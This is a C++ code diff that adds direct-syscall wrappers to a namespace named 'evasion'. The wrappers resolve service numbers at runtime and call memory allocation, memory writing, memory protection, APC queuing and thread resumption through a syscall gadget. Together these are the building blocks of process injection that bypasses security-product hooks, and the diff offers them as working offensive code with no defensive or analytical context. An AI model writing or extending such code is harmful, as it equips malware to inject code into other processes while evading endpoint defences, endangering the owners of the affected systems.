@@ -99,4 +99,35 @@ PVOID SyscallResolver::GetSyscallGadget() {
     return m_syscallGadget;
 }
 
+NTSTATUS SysNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
+    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtAllocateVirtualMemory");
+    if (ssn == 0xFFFFFFFF) return 0xC0000001;
+    return InternalDoSyscall(ssn, ProcessHandle, BaseAddress, (PVOID)ZeroBits, RegionSize, (PVOID)(UINT_PTR)AllocationType, (PVOID)(UINT_PTR)Protect, NULL, NULL, NULL, NULL, NULL);
+}
+
+NTSTATUS SysNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
+    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtWriteVirtualMemory");
+    if (ssn == 0xFFFFFFFF) return 0xC0000001;
+    return InternalDoSyscall(ssn, ProcessHandle, BaseAddress, Buffer, (PVOID)NumberOfBytesToWrite, (PVOID)NumberOfBytesWritten, NULL, NULL, NULL, NULL, NULL, NULL);
+}
+
+NTSTATUS SysNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
+    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtProtectVirtualMemory");
+    if (ssn == 0xFFFFFFFF) return 0xC0000001;
+    return InternalDoSyscall(ssn, ProcessHandle, BaseAddress, RegionSize, (PVOID)(UINT_PTR)NewProtect, OldProtect, NULL, NULL, NULL, NULL, NULL, NULL);
+}
+
+NTSTATUS SysNtQueueApcThreadEx(HANDLE ThreadHandle, HANDLE UserApcReserveHandle, PVOID ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3) {
+    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtQueueApcThreadEx");
+    if (ssn == 0xFFFFFFFF) return 0xC0000001;
+    // NtQueueApcThreadEx(ThreadHandle, UserApcReserveHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3)
+    return InternalDoSyscall(ssn, ThreadHandle, UserApcReserveHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3, NULL, NULL, NULL, NULL, NULL);
+}
+
+NTSTATUS SysNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount) {
+    DWORD ssn = SyscallResolver::GetInstance().GetServiceNumber("NtResumeThread");
+    if (ssn == 0xFFFFFFFF) return 0xC0000001;
+    return InternalDoSyscall(ssn, ThreadHandle, SuspendCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+}
+
 } // namespace evasion
